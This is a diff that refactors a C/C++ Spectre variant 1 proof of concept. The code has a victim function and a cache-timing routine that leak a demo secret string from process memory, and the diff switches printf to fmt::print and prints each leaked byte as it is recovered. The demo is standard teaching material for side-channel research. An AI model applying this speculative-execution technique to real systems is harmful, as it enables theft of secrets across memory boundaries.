@@ -1,8 +1,10 @@
+#include <fmt/core.h>
 #include <stdio.h>
 #include <stdint.h>
 #include <string.h>
 #include <x86intrin.h> /* for rdtscp and clflush */
 #include <string>
+#include <fmt/format.h>
 
 /********************************************************************
 Victim code.
@@ -14,7 +16,7 @@ uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64];
 uint8_t array2[NUM_PAGES * 512];
 
-char* secret = "I Love Minecraft";
+const char* secret = "I Love Minecraft";
 
 uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
 
@@ -29,7 +31,7 @@ void victim_function(size_t x)
 /********************************************************************
 Analysis code
 ********************************************************************/
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+constexpr auto CACHE_HIT_THRESHOLD = 80; /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, int32_t value[2], int32_t score[2])
@@ -107,13 +109,14 @@ void readMemoryByte(size_t malicious_x, int32_t value[2], int32_t score[2])
 
 int main(int argc, const char* * argv)
 {
-	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
+	fmt::print("Putting '{}' in memory, address {}\n", secret, (void*)secret);
 	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
 
-	printf("secret = %p\n", secret);
-	printf("array1 = %p\n", array1);
-	printf("malicious_x = %p\n", (char*)malicious_x);
-	int32_t score[2], len = strlen(secret);
+	fmt::print("secret = {}\n", (void*)secret);
+	fmt::print("array1 = {}\n", (void*)array1);
+	fmt::print("malicious_x = {}\n", (void*)malicious_x);
+	int32_t score[2];
+	int32_t len = strlen(secret);
 	int32_t value[2];
 
 	for (size_t i = 0; i < sizeof(array2); i++)
@@ -135,6 +138,7 @@ int main(int argc, const char* * argv)
 		// printf("Reading at malicious_x = %p... ", (void *)malicious_x);
 		readMemoryByte(malicious_x++, value, score);
 		secret_message += (char)value[0];
+		printf("%c", (char)value[0]);
 		// printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
 		// printf("0x%02X='%c' score=%d ", value[0],
 		//        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
@@ -144,6 +148,6 @@ int main(int argc, const char* * argv)
 		// 		   score[1]);
 		// printf("\n");
 	}
-	printf("Secret: %s\n", secret_message.c_str());
+	// printf("Secret: %s\n", secret_message.c_str());
 	return (0);
 }
